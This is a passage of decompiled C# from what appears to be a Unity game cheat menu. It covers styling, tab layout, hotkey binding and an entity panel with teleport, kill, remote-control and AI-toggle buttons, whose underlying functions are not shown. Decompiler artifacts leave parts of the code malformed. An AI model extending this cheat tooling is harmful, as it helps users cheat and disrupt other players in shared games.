			((Color)(ref textColor))..ctor(0f, 0.6f, 1f, 1f);
			Color col6 = default(Color);
			((Color)(ref col6))..ctor(0.15f, 0.15f, 0.15f, 1f);
			Color col7 = default(Color);
			((Color)(ref col7))..ctor(0.08f, 0.08f, 0.08f, 1f);
			Color col8 = default(Color);
			((Color)(ref col8))..ctor(0.18f, 0.18f, 0.18f, 1f);
			new Color(0.2f, 0.2f, 0.2f, 0.8f);
			new Color(0f, 0.6f, 1f, 0.2f);
			windowStyle = new GUIStyle(GUI.skin.window);
			Texture2D background = GUIHelpers.MakeTex(2, 2, col);
			windowStyle.normal.background = background;
			windowStyle.onNormal.background = background;
			windowStyle.hover.background = background;
			windowStyle.focused.background = background;
			windowStyle.border = new RectOffset(2, 2, 30, 2);
			windowStyle.padding = new RectOffset(8, 8, 30, 8);
			windowStyle.contentOffset = new Vector2(0f, 0f);
			buttonStyle = new GUIStyle(GUI.skin.button);
			buttonStyle.normal.background = GUIHelpers.MakeTex(2, 2, col3);
			buttonStyle.hover.background = GUIHelpers.MakeTex(2, 2, col4);
			buttonStyle.active.background = GUIHelpers.MakeTex(2, 2, col5);
			buttonStyle.normal.textColor = new Color(0.95f, 0.95f, 0.95f, 1f);
			buttonStyle.hover.textColor = textColor;
			buttonStyle.active.textColor = new Color(0.85f, 0.85f, 0.85f, 1f);
			buttonStyle.fontSize = 13;
			buttonStyle.fontStyle = (FontStyle)0;
			buttonStyle.padding = new RectOffset(16, 16, 8, 8);
			buttonStyle.alignment = TextAnchor.MiddleCenter;
			buttonStyle.border = new RectOffset(4, 4, 4, 4);
			toggleStyle = new GUIStyle(GUI.skin.button);
			toggleStyle.normal.background = GUIHelpers.MakeTex(2, 2, col7);
			toggleStyle.hover.background = GUIHelpers.MakeTex(2, 2, col8);
			toggleStyle.active.background = GUIHelpers.MakeTex(2, 2, col6);
			toggleStyle.onNormal.background = GUIHelpers.MakeTex(2, 2, col6);
			toggleStyle.onHover.background = GUIHelpers.MakeTex(2, 2, new Color(0.2f, 0.2f, 0.2f, 1f));
			toggleStyle.normal.textColor = new Color(0.6f, 0.6f, 0.6f, 1f);
			toggleStyle.onNormal.textColor = textColor;
			toggleStyle.hover.textColor = new Color(0.8f, 0.8f, 0.8f, 1f);
			toggleStyle.onHover.textColor = textColor;
			toggleStyle.fontSize = 13;
			toggleStyle.fontStyle = FontStyle.Bold;
			toggleStyle.padding = new RectOffset(16, 16, 10, 10);
			toggleStyle.alignment = TextAnchor.MiddleCenter;
			toggleStyle.border = new RectOffset(2, 2, 2, 2);
			labelStyle = new GUIStyle(GUI.skin.label);
			labelStyle.normal.textColor = Color.white;
			labelStyle.fontSize = 12;
			labelStyle.fontStyle = (FontStyle)0;
			labelStyle.alignment = (TextAnchor)3;
			labelStyle.wordWrap = true;
			headerStyle = new GUIStyle(GUI.skin.label);
			headerStyle.normal.textColor = Color.white;
			headerStyle.fontSize = 16;
			headerStyle.fontStyle = FontStyle.Bold;
			headerStyle.alignment = (TextAnchor)3;
			headerStyle.padding = new RectOffset(0, 0, 4, 6);
			sectionHeaderStyle = new GUIStyle(GUI.skin.label);
			sectionHeaderStyle.normal.textColor = textColor;
			sectionHeaderStyle.fontSize = 13;
			sectionHeaderStyle.fontStyle = FontStyle.Bold;
			sectionHeaderStyle.alignment = (TextAnchor)3;
			sectionHeaderStyle.padding = new RectOffset(0, 0, 2, 4);
			boxStyle = new GUIStyle(GUI.skin.box);
			boxStyle.normal.background = GUIHelpers.MakeTex(2, 2, col2);
			boxStyle.normal.textColor = new Color(0.88f, 0.88f, 0.92f, 1f);
			boxStyle.border = new RectOffset(10, 10, 10, 10);
			boxStyle.padding = new RectOffset(16, 16, 16, 16);
			GUI.skin.box = boxStyle;
			textFieldStyle = new GUIStyle(GUI.skin.textField);
			textFieldStyle.normal.background = GUIHelpers.MakeTex(2, 2, new Color(0.1f, 0.12f, 0.15f, 1f));
			textFieldStyle.focused.background = GUIHelpers.MakeTex(2, 2, new Color(0.12f, 0.15f, 0.18f, 1f));
			textFieldStyle.normal.textColor = new Color(0.98f, 0.98f, 0.98f, 1f);
			textFieldStyle.focused.textColor = Color.white;
			textFieldStyle.fontSize = 13;
			textFieldStyle.padding = new RectOffset(10, 10, 6, 6);
			textFieldStyle.border = new RectOffset(6, 6, 6, 6);
			GUI.skin.textField = textFieldStyle;
			GUI.skin.verticalScrollbar.normal.background = GUIHelpers.MakeTex(2, 2, new Color(0.12f, 0.14f, 0.17f, 1f));
			GUI.skin.verticalScrollbarThumb.normal.background = GUIHelpers.MakeTex(2, 2, new Color(0.25f, 0.3f, 0.35f, 1f));
			GUI.skin.verticalScrollbarThumb.hover.background = GUIHelpers.MakeTex(2, 2, new Color(0.3f, 0.35f, 0.4f, 1f));
			GUI.skin.horizontalScrollbar.normal.background = GUIHelpers.MakeTex(2, 2, new Color(0.12f, 0.14f, 0.17f, 1f));
			GUI.skin.horizontalScrollbarThumb.normal.background = GUIHelpers.MakeTex(2, 2, new Color(0.25f, 0.3f, 0.35f, 1f));
			GUI.skin.horizontalScrollbarThumb.hover.background = GUIHelpers.MakeTex(2, 2, new Color(0.3f, 0.35f, 0.4f, 1f));
			foldoutStyle = new GUIStyle(GUI.skin.GetStyle("foldout"));
			foldoutStyle.fontSize = 13;
			foldoutStyle.fontStyle = FontStyle.Bold;
			foldoutStyle.normal.textColor = new Color(0.85f, 0.85f, 0.85f, 1f);
			foldoutStyle.onNormal.textColor = textColor;
			foldoutStyle.hover.textColor = new Color(0.95f, 0.95f, 0.95f, 1f);
			foldoutStyle.onHover.textColor = textColor;
			foldoutStyle.padding = new RectOffset(18, 4, 4, 4);
		}

		public static void GUIMain(int windowID)
		{
			InitializeStyles();
			GUI.backgroundColor = new Color(1f, 1f, 1f, 1f);
			GUI.contentColor = new Color(1f, 1f, 1f, 1f);
			GUI.color = new Color(1f, 1f, 1f, 1f);
			Color col = default(Color);
			((Color)(ref col))..ctor(0.05f, 0.05f, 0.05f, 0.95f);
			Color col2 = default(Color);
			((Color)(ref col2))..ctor(0.03f, 0.03f, 0.03f, 1f);
			Color col3 = default(Color);
			((Color)(ref col3))..ctor(0.12f, 0.12f, 0.12f, 1f);
			Color col4 = default(Color);
			((Color)(ref col4))..ctor(0.2f, 0.2f, 0.2f, 1f);
			Color col5 = default(Color);
			((Color)(ref col5))..ctor(0.08f, 0.08f, 0.08f, 1f);
			Color col6 = default(Color);
			((Color)(ref col6))..ctor(0.08f, 0.08f, 0.08f, 1f);
			Color col7 = default(Color);
			((Color)(ref col7))..ctor(0.12f, 0.12f, 0.12f, 1f);
			if (windowStyle != null)
			{
				Texture2D val = windowStyle.normal.background;
				if (val == null)
				{
					val = GUIHelpers.MakeTex(2, 2, col);
				}
				windowStyle.normal.background = val;
				windowStyle.onNormal.background = val;
				windowStyle.hover.background = val;
				windowStyle.focused.background = val;
				GUI.skin.window = windowStyle;
			}
			if (buttonStyle != null)
			{
				if (buttonStyle.normal.background == null)
				{
					buttonStyle.normal.background = GUIHelpers.MakeTex(2, 2, col3);
				}
				if (buttonStyle.hover.background == null)
				{
					buttonStyle.hover.background = GUIHelpers.MakeTex(2, 2, col4);
				}
				if (buttonStyle.active.background == null)
				{
					buttonStyle.active.background = GUIHelpers.MakeTex(2, 2, col5);
				}
				GUI.skin.button = buttonStyle;
			}
			if (labelStyle != null)
			{
				GUI.skin.label = labelStyle;
			}
			if (boxStyle != null)
			{
				if (boxStyle.normal.background == null)
				{
					boxStyle.normal.background = GUIHelpers.MakeTex(2, 2, col2);
				}
				GUI.skin.box = boxStyle;
			}
			if (textFieldStyle != null)
			{
				if (textFieldStyle.normal.background == null)
				{
					textFieldStyle.normal.background = GUIHelpers.MakeTex(2, 2, col6);
				}
				if (textFieldStyle.focused.background == null)
				{
					textFieldStyle.focused.background = GUIHelpers.MakeTex(2, 2, col7);
				}
				GUI.skin.textField = textFieldStyle;
			}
			GUILayout.BeginArea(new Rect(8f, 30f, (GUIRect).width - 16f, (GUIRect).height - 38f));
			GUILayout.Space(4f);
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			GUILayout.Space(2f);
			for (int i = 0; i < tabnames.Length; i++)
			{
				bool flag = selected_tab == i;
				string key = $"tab_{i}_{flag}";
				GUIStyle val2;
				if (!GUIHelpers.styleCache.ContainsKey(key))
				{
					val2 = new GUIStyle(toggleStyle);
					if (flag)
					{
						val2.normal.background = GUIHelpers.MakeTex(2, 2, new Color(0.15f, 0.15f, 0.15f, 1f));
						val2.hover.background = GUIHelpers.MakeTex(2, 2, new Color(0.2f, 0.2f, 0.2f, 1f));
						val2.normal.textColor = new Color(0f, 0.6f, 1f, 1f);
						val2.hover.textColor = new Color(0.2f, 0.7f, 1f, 1f);
					}
					else
					{
						val2.normal.background = GUIHelpers.MakeTex(2, 2, new Color(0.08f, 0.08f, 0.08f, 1f));
						val2.hover.background = GUIHelpers.MakeTex(2, 2, new Color(0.12f, 0.12f, 0.12f, 1f));
						val2.normal.textColor = new Color(0.6f, 0.6f, 0.6f, 1f);
						val2.hover.textColor = new Color(0.8f, 0.8f, 0.8f, 1f);
					}
					val2.padding = new RectOffset(16, 16, 10, 10);
					val2.fontSize = 13;
					val2.fontStyle = FontStyle.Bold;
					GUIHelpers.styleCache[key] = val2;
				}
				else
				{
					val2 = GUIHelpers.styleCache[key];
				}
				if (GUILayout.Button(tabnames[i], val2, (GUILayoutOption[])(object)new GUILayoutOption[2]
				{
					GUILayout.Height(40f),
					GUILayout.Width(((GUIRect).width - 32f) / (float)tabnames.Length)
				}))
				{
					selected_tab = i;
				}
				GUILayout.Space(2f);
			}
			GUILayout.Space(2f);
			GUILayout.EndHorizontal();
			GUILayout.Space(6f);
			GUI.DrawTexture(GUILayoutUtility.GetRect((GUIRect).width - 16f, 1f), (Texture)(object)GUIHelpers.MakeTex(1, 1, new Color(0.2f, 0.2f, 0.2f, 0.8f)));
			GUILayout.Space(8f);
			switch (selected_tab)
			{
			case 0:
				visualScrollPos = GUILayout.BeginScrollView(visualScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(GetScrollViewHeight()) });
				DrawSelfOptionsTab();
				GUILayout.EndScrollView();
				break;
			case 1:
				itemScrollPos = GUILayout.BeginScrollView(itemScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(GetScrollViewHeight()) });
				DrawWorldTab();
				GUILayout.EndScrollView();
				break;
			case 2:
				visualScrollPos = GUILayout.BeginScrollView(visualScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(GetScrollViewHeight()) });
				DrawVisualsTab();
				GUILayout.EndScrollView();
				break;
			case 3:
				playersScrollPos = GUILayout.BeginScrollView(playersScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(GetScrollViewHeight()) });
				DrawPlayersTab();
				GUILayout.EndScrollView();
				break;
			case 4:
				networkScrollPos = GUILayout.BeginScrollView(networkScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(GetScrollViewHeight()) });
				DrawMiscTab();
				GUILayout.EndScrollView();
				break;
			case 5:
				settingsScrollPos = GUILayout.BeginScrollView(settingsScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(GetScrollViewHeight()) });
				DrawSettingsTab();
				GUILayout.EndScrollView();
				break;
			}
			GUILayout.EndArea();
			GUI.DragWindow();
		}

		public static void DrawSelfOptionsTab()
		{
			GUISelfOptionsTab.Draw();
		}

		public static void DrawVisualsTab()
		{
			GUIVisualsTab.Draw();
		}

		public static void DrawWorldTab()
		{
			GUIWorldTab.Draw();
		}

		public static void DrawPlayersTab()
		{
			GUIPlayersTab.Draw();
		}

		public static void DrawMiscTab()
		{
			GUINetworkTab.Draw();
		}

		public static bool DrawToggleButton(bool currentState, string label)
		{
			Color backgroundColor = GUI.backgroundColor;
			Color contentColor = GUI.contentColor;
			Color val = default(Color);
			((Color)(ref val))..ctor(0f, 0.5f, 0.85f, 1f);
			Color col = default(Color);
			((Color)(ref col))..ctor(0.1f, 0.6f, 0.9f, 1f);
			Color val2 = default(Color);
			((Color)(ref val2))..ctor(0.12f, 0.12f, 0.12f, 1f);
			Color col2 = default(Color);
			((Color)(ref col2))..ctor(0.18f, 0.18f, 0.18f, 1f);
			if (currentState)
			{
				GUI.backgroundColor = val;
				GUI.contentColor = Color.white;
			}
			else
			{
				GUI.backgroundColor = val2;
				GUI.contentColor = new Color(0.88f, 0.88f, 0.92f, 1f);
			}
			GUIStyle val3 = new GUIStyle(buttonStyle);
			if (currentState)
			{
				val3.normal.background = GUIHelpers.MakeTex(2, 2, val);
				val3.hover.background = GUIHelpers.MakeTex(2, 2, col);
				val3.active.background = GUIHelpers.MakeTex(2, 2, new Color(0f, 0.75f, 0.38f, 1f));
				val3.normal.textColor = Color.white;
				val3.hover.textColor = Color.white;
			}
			else
			{
				val3.normal.background = GUIHelpers.MakeTex(2, 2, val2);
				val3.hover.background = GUIHelpers.MakeTex(2, 2, col2);
				val3.active.background = GUIHelpers.MakeTex(2, 2, new Color(0.12f, 0.14f, 0.17f, 1f));
				val3.normal.textColor = new Color(0.88f, 0.88f, 0.92f, 1f);
				val3.hover.textColor = new Color(0.95f, 0.95f, 1f, 1f);
			}
			val3.alignment = (TextAnchor)3;
			val3.padding = new RectOffset(20, 14, 12, 12);
			val3.fontSize = 14;
			val3.fontStyle = (FontStyle)0;
			val3.border = new RectOffset(6, 6, 6, 6);
			string text = (currentState ? ("� " + label) : ("  " + label));
			bool result = GUILayout.Toggle(currentState, text, val3, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(40f) });
			GUI.backgroundColor = backgroundColor;
			GUI.contentColor = contentColor;
			return result;
		}

		private static bool DrawCollapsibleSection(string key, string title, Color? titleColor = null)
		{
			if (!CheatConfig.CollapsibleSections.ContainsKey(key))
			{
				CheatConfig.CollapsibleSections[key] = false;
			}
			bool flag = CheatConfig.CollapsibleSections[key];
			GUIStyle val = new GUIStyle(foldoutStyle);
			Color val2 = (Color)(((??)titleColor) ?? new Color(0.9f, 0.95f, 1f, 1f));
			if (flag)
			{
				val.normal.textColor = val2;
				val.onNormal.textColor = val2;
				val.hover.textColor = Color.white;
				val.onHover.textColor = Color.white;
			}
			else
			{
				val.normal.textColor = new Color(val2.r * 0.7f, val2.g * 0.7f, val2.b * 0.7f, 1f);
				val.onNormal.textColor = val2;
				val.hover.textColor = new Color(val2.r * 0.9f, val2.g * 0.9f, val2.b * 0.9f, 1f);
				val.onHover.textColor = Color.white;
			}
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			GUILayout.Space(4f);
			string text = (flag ? title.Replace("?", "") : title);
			bool flag2 = GUILayout.Toggle(flag, text, val, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) });
			GUILayout.EndHorizontal();
			if (flag2 != flag)
			{
				CheatConfig.CollapsibleSections[key] = flag2;
			}
			if (flag2)
			{
				GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
				GUILayout.Space(6f);
			}
			return flag2;
		}

		private static void EndCollapsibleSection()
		{
			GUILayout.EndVertical();
			GUILayout.Space(8f);
		}

		public static void DrawTrollTab()
		{
			GUITrollTab.Draw();
		}

		public static void DrawNetworkTab()
		{
			GUINetworkTab.Draw();
		}

		public static void DrawSettingsTab()
		{
			GUISettingsTab.Draw();
		}

		public static void DrawHotkeyRow(string featureName)
		{
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			string text = featureName.Replace("ESP", "").Replace("Player", "").Replace("Item", "")
				.Replace("Entity", "");
			if (string.IsNullOrEmpty(text.Trim()))
			{
				text = featureName;
			}
			GUILayout.Label(text, labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(150f) });
			KeyCode hotkey = HotkeyManager.GetHotkey(featureName);
			string text2 = (((int)hotkey == 0) ? "None" : HotkeyManager.GetKeyDisplayName(hotkey));
			if (hotkeyEditingFeature == featureName)
			{
				GUILayout.Label("Press any key...", new GUIStyle(labelStyle)
				{
					normal = new GUIStyleState
					{
						textColor = new Color(1f, 1f, 0.4f, 1f)
					}
				}, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				if (Time.time - lastHotkeyEditTime > 0.1f)
				{
					foreach (KeyCode value in Enum.GetValues(typeof(KeyCode)))
					{
						if (Input.GetKeyDown(value) && (int)value != 0 && (int)value != 323 && (int)value != 324 && (int)value != 325)
						{
							HotkeyManager.SetHotkey(featureName, value);
							hotkeyEditingFeature = null;
							ConfigManager.SaveConfig();
							break;
						}
					}
				}
			}
			else if (GUILayout.Button(text2, buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(120f),
				GUILayout.Height(24f)
			}))
			{
				hotkeyEditingFeature = featureName;
				lastHotkeyEditTime = Time.time;
			}
			if ((int)hotkey != 0 && GUILayout.Button("Clear", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(60f),
				GUILayout.Height(24f)
			}))
			{
				HotkeyManager.SetHotkey(featureName, (KeyCode)0);
				ConfigManager.SaveConfig();
			}
			GUILayout.EndHorizontal();
		}
	}
	public static class GUIHelpers
	{
		private static Dictionary<Color, Texture2D> textureCache = new Dictionary<Color, Texture2D>();

		public static Dictionary<string, GUIStyle> styleCache = new Dictionary<string, GUIStyle>();

		public static float GetScrollViewHeight()
		{
			return Mathf.Max(((Rect)(ref GUI.GUIRect)).height - 140f, 500f);
		}

		public static string TruncateForDisplay(string text, int maxLength = 64)
		{
			if (string.IsNullOrEmpty(text))
			{
				return text;
			}
			if (text.Length <= maxLength)
			{
				return text;
			}
			return text.Substring(0, maxLength - 3) + "...";
		}

		public static Texture2D MakeTex(int width, int height, Color col)
		{
			Color key = default(Color);
			((Color)(ref key))..ctor(Mathf.Round(col.r * 1000f) / 1000f, Mathf.Round(col.g * 1000f) / 1000f, Mathf.Round(col.b * 1000f) / 1000f, Mathf.Round(col.a * 1000f) / 1000f);
			if (textureCache.ContainsKey(key))
			{
				return textureCache[key];
			}
			Color[] array = (Color[])(object)new Color[width * height];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = col;
			}
			Texture2D val = new Texture2D(width, height);
			val.SetPixels(array);
			val.Apply();
			textureCache[key] = val;
			return val;
		}

		public static void ClearCache()
		{
			foreach (Texture2D value in textureCache.Values)
			{
				if (value != null)
				{
					Object.DestroyImmediate((Object)(object)value);
				}
			}
			textureCache.Clear();
			styleCache.Clear();
		}

		public static bool DrawToggleButton(bool currentState, string label)
		{
			Color backgroundColor = GUI.backgroundColor;
			Color contentColor = GUI.contentColor;
			Color val = default(Color);
			((Color)(ref val))..ctor(0f, 0.5f, 0.85f, 1f);
			Color col = default(Color);
			((Color)(ref col))..ctor(0.1f, 0.6f, 0.9f, 1f);
			Color val2 = default(Color);
			((Color)(ref val2))..ctor(0.12f, 0.12f, 0.12f, 1f);
			Color col2 = default(Color);
			((Color)(ref col2))..ctor(0.18f, 0.18f, 0.18f, 1f);
			if (currentState)
			{
				GUI.backgroundColor = val;
				GUI.contentColor = Color.white;
			}
			else
			{
				GUI.backgroundColor = val2;
				GUI.contentColor = new Color(0.88f, 0.88f, 0.92f, 1f);
			}
			string key = $"toggle_{currentState}";
			GUIStyle val3;
			if (!styleCache.ContainsKey(key))
			{
				val3 = new GUIStyle(GUI.buttonStyle);
				if (currentState)
				{
					val3.normal.background = MakeTex(2, 2, val);
					val3.hover.background = MakeTex(2, 2, col);
					val3.active.background = MakeTex(2, 2, new Color(0f, 0.75f, 0.38f, 1f));
					val3.normal.textColor = Color.white;
					val3.hover.textColor = Color.white;
				}
				else
				{
					val3.normal.background = MakeTex(2, 2, val2);
					val3.hover.background = MakeTex(2, 2, col2);
					val3.active.background = MakeTex(2, 2, new Color(0.12f, 0.14f, 0.17f, 1f));
					val3.normal.textColor = new Color(0.88f, 0.88f, 0.92f, 1f);
					val3.hover.textColor = new Color(0.95f, 0.95f, 1f, 1f);
				}
				val3.alignment = (TextAnchor)3;
				val3.padding = new RectOffset(20, 14, 12, 12);
				val3.fontSize = 14;
				val3.fontStyle = (FontStyle)0;
				val3.border = new RectOffset(6, 6, 6, 6);
				styleCache[key] = val3;
			}
			else
			{
				val3 = styleCache[key];
			}
			string text = (currentState ? ("� " + label) : ("  " + label));
			bool result = GUILayout.Toggle(currentState, text, val3, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(40f) });
			GUI.backgroundColor = backgroundColor;
			GUI.contentColor = contentColor;
			return result;
		}

		public static bool DrawCollapsibleSection(string key, string title, Color? titleColor = null)
		{
			if (!CheatConfig.CollapsibleSections.ContainsKey(key))
			{
				CheatConfig.CollapsibleSections[key] = false;
			}
			bool flag = CheatConfig.CollapsibleSections[key];
			Color val = (Color)(((??)titleColor) ?? new Color(0.9f, 0.95f, 1f, 1f));
			string key2 = $"foldout_{key}_{((object)(Color)(ref val)).GetHashCode()}_{flag}";
			GUIStyle val2;
			if (!styleCache.ContainsKey(key2))
			{
				val2 = new GUIStyle(GUI.foldoutStyle);
				if (flag)
				{
					val2.normal.textColor = val;
					val2.onNormal.textColor = val;
					val2.hover.textColor = Color.white;
					val2.onHover.textColor = Color.white;
				}
				else
				{
					val2.normal.textColor = new Color(val.r * 0.7f, val.g * 0.7f, val.b * 0.7f, 1f);
					val2.onNormal.textColor = val;
					val2.hover.textColor = new Color(val.r * 0.9f, val.g * 0.9f, val.b * 0.9f, 1f);
					val2.onHover.textColor = Color.white;
				}
				styleCache[key2] = val2;
			}
			else
			{
				val2 = styleCache[key2];
			}
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			GUILayout.Space(4f);
			string text = (flag ? title.Replace("?", "") : title);
			bool flag2 = GUILayout.Toggle(flag, text, val2, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) });
			GUILayout.EndHorizontal();
			if (flag2 != flag)
			{
				CheatConfig.CollapsibleSections[key] = flag2;
			}
			if (flag2)
			{
				GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
				GUILayout.Space(6f);
			}
			return flag2;
		}

		public static void EndCollapsibleSection()
		{
			GUILayout.EndVertical();
			GUILayout.Space(8f);
		}
	}
	public static class GUIEntityManagement
	{
		public static void Draw()
		{
			try
			{
				GUI.CleanupDestroyedEntities();
				List<GameObject> list = null;
				if (CheatConfig._cachedEntityList != null && CheatConfig._cachedEntityList.Count > 0 && !CheatConfig._entityListNeedsRefresh)
				{
					list = CheatConfig._cachedEntityList;
					list.RemoveAll((GameObject e) => e == null);
				}
				else
				{
					list = GUI.GetAllEntitiesInGame();
					CheatConfig._entityListNeedsRefresh = false;
				}
				if (GUIHelpers.DrawCollapsibleSection("EntityList", "? All Entities in Game", Color.white))
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("Entities:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Refresh", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
					{
						GUILayout.Width(90f),
						GUILayout.Height(32f)
					}))
					{
						CheatConfig._entityListNeedsRefresh = true;
						list = GUI.GetAllEntitiesInGame();
					}
					GUILayout.EndHorizontal();
					GUILayout.Space(4f);
					if (list == null || list.Count == 0)
					{
						GUILayout.Label("No entities found in game. Click Refresh to search.", GUI.labelStyle, Array.Empty<GUILayoutOption>());
					}
					else
					{
						GUILayout.Label($"Total: {list.Count} entities", new GUIStyle(GUI.labelStyle)
						{
							fontSize = 11
						}, Array.Empty<GUILayoutOption>());
						GUILayout.Space(4f);
						int num = 50;
						int num2 = Mathf.Min(list.Count, num);
						for (int i = 0; i < num2; i++)
						{
							try
							{
								if ((Object)(object)list[i] == (Object)null)
								{
									continue;
								}
								GameObject val = list[i];
								if (val == null)
								{
									continue;
								}
								string text = "Unknown";
								string arg = "Unknown";
								try
								{
									text = GUI.GetEntityDisplayName(val);
									arg = GUI.GetEntityType(val);
								}
								catch (Exception ex)
								{
									Debug.LogWarning((object)("[GUI] Error getting entity name/type: " + ex.Message));
									text = ((Object)val).name ?? "Unknown";
								}
								string text2 = $"[{i}] {text} ({arg})";
								try
								{
									if (Character.localCharacter != null && Camera.main != null && val.transform != null)
									{
										float num3 = Vector3.Distance(val.transform.position, Camera.main.transform.position);
										text2 += $" ({num3:F1}m away)";
									}
								}
								catch
								{
								}
								bool flag = GUI.selectedEntityIndex == i;
								Color backgroundColor = GUI.backgroundColor;
								Color contentColor = GUI.contentColor;
								if (flag)
								{
									GUI.backgroundColor = new Color(0.2f, 0.6f, 1f, 0.3f);
									GUI.contentColor = Color.white;
								}
								GUILayout.BeginHorizontal(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
								if (GUILayout.Toggle(flag, "", (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(20f) }))
								{
									GUI.selectedEntityIndex = i;
								}
								else if (flag)
								{
									GUI.selectedEntityIndex = -1;
								}
								GUILayout.Label(text2, GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.ExpandWidth(true) });
								GUILayout.EndHorizontal();
								GUI.backgroundColor = backgroundColor;
								GUI.contentColor = contentColor;
							}
							catch (Exception ex2)
							{
								Debug.LogWarning((object)$"[GUI] Error rendering entity {i}: {ex2.Message}");
							}
						}
						if (list.Count > num)
						{
							GUILayout.Label($"... and {list.Count - num} more entities (scroll to see)", new GUIStyle(GUI.labelStyle)
							{
								fontSize = 10,
								normal = new GUIStyleState
								{
									textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
								}
							}, Array.Empty<GUILayoutOption>());
						}
					}
					GUIHelpers.EndCollapsibleSection();
				}
				if (list != null && GUI.selectedEntityIndex >= 0 && GUI.selectedEntityIndex < list.Count && (Object)(object)list[GUI.selectedEntityIndex] != (Object)null)
				{
					try
					{
						GameObject val2 = list[GUI.selectedEntityIndex];
						string text3 = "Unknown";
						try
						{
							text3 = GUI.GetEntityDisplayName(val2);
						}
						catch
						{
							text3 = ((Object)val2).name ?? "Unknown";
						}
						if (GUIHelpers.DrawCollapsibleSection("EntityActions", "? Actions for: " + text3, Color.white))
						{
							GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
							if (GUILayout.Button("Teleport to Me", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
							{
								try
								{
									GUI.TeleportEntityToMe(val2);
								}
								catch (Exception ex3)
								{
									Debug.LogError((object)("[GUI] Error teleporting entity: " + ex3.Message));
								}
							}
							if (GUILayout.Button("Kill", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
							{
								try
								{
									GUI.KillEntity(val2);
									GUI.selectedEntityIndex = -1;
								}
								catch (Exception ex4)
								{
									Debug.LogError((object)("[GUI] Error killing entity: " + ex4.Message));
								}
							}
							GUILayout.EndHorizontal();
							GUILayout.Space(4f);
							bool flag2 = false;
							try
							{
								flag2 = GUI.controlledEntities.ContainsKey(val2) && GUI.controlledEntities[val2];
								bool flag3 = GUIHelpers.DrawToggleButton(flag2, "Control Entity (WASD + Camera)");
								if (flag3 != flag2)
								{
									try
									{
										GUI.controlledEntities[val2] = flag3;
										if (flag3)
										{
											GUI.EnableEntityControl(val2);
											GUI.SwitchCameraToEntity(val2);
										}
										else
										{
											GUI.DisableEntityControl(val2);
											GUI.RestoreCameraToPlayer();
										}
										flag2 = flag3;
									}
									catch (Exception ex5)
									{
										Debug.LogError((object)("[GUI] Error toggling entity control: " + ex5.Message));
									}
								}
								if (flag2 && (Object)(object)GUI.currentlyControlledEntity == (Object)(object)val2)
								{
									GUILayout.Label("� Currently controlling this entity", new GUIStyle(GUI.labelStyle)
									{
										normal = new GUIStyleState
										{
											textColor = Color.green
										},
										fontSize = 11
									}, Array.Empty<GUILayoutOption>());
								}
							}
							catch (Exception ex6)
							{
								Debug.LogWarning((object)("[GUI] Error in control toggle: " + ex6.Message));
								try
								{
									flag2 = GUI.controlledEntities.ContainsKey(val2) && GUI.controlledEntities[val2];
								}
								catch
								{
								}
							}
							try
							{
								bool flag4 = GUI.followPlayerEntities.ContainsKey(val2) && GUI.followPlayerEntities[val2];
								bool flag5 = GUIHelpers.DrawToggleButton(flag4, "Follow Player");
								if (flag5 != flag4)
								{
									try
									{
										GUI.followPlayerEntities[val2] = flag5;
										if (flag5)
										{
											GUI.targetPositions.Remove(val2);
										}
									}
									catch (Exception ex7)
									{
										Debug.LogError((object)("[GUI] Error toggling follow player: " + ex7.Message));
									}
								}
							}
							catch (Exception ex8)
							{
								Debug.LogWarning((object)("[GUI] Error in follow toggle: " + ex8.Message));
							}
							GUILayout.Space(4f);
							if (GUIHelpers.DrawCollapsibleSection("AIControl", "? AI Control", Color.white))
							{
								try
								{
									MonoBehaviour[] aIComponents = GUI.GetAIComponents(val2);
									if (aIComponents != null && aIComponents.Length != 0)
									{
										MonoBehaviour[] array = aIComponents;
										foreach (MonoBehaviour val3 in array)
										{
											try
											{
												if (val3 != null)
												{
													string name = ((object)val3).GetType().Name;
													bool enabled = ((Behaviour)val3).enabled;
													bool flag6 = GUIHelpers.DrawToggleButton(enabled, name);
													if (flag6 != enabled)
													{
														((Behaviour)val3).enabled = flag6;
														Debug.Log((object)("[Cheat] " + (flag6 ? "Enabled" : "Disabled") + " AI component: " + name));
													}
												}
											}
											catch (Exception ex9)
											{
